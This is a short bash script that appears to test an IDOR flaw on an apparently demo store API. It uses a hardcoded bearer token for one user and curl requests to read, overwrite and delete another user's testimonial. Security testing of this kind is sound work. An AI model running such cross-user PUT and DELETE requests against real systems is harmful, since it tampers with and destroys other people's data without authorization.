#!/bin/bash
TOKEN_B="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNDRiZTNmMDItNzk1ZC00YThlLWIyMzMtNDNiNDY4YTZhY2Q2IiwidXNlcm5hbWUiOiJ1c2VyX2JfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NjA0NzJ9.oO703UFS8BaDxyqg7CbC4iV0Zn1Ha3YO-E6nEFlSSQs"

echo "=== Test 1: user_b GET user_a's testimonial (ID 11) ==="
curl -v -X GET "https://duck-store.escape.tech/api/v1/testimonials/11" \
  -H "Authorization: Bearer $TOKEN_B"

echo -e "\n=== Test 2: user_b PUT user_a's testimonial (ID 11) ==="
curl -v -X PUT "https://duck-store.escape.tech/api/v1/testimonials/11" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"content": "MODIFIED by user_b - IDOR exploit", "rating": 1}'

echo -e "\n=== Test 3: user_b DELETE user_a's testimonial (ID 11) ==="
curl -v -X DELETE "https://duck-store.escape.tech/api/v1/testimonials/11" \
  -H "Authorization: Bearer $TOKEN_B"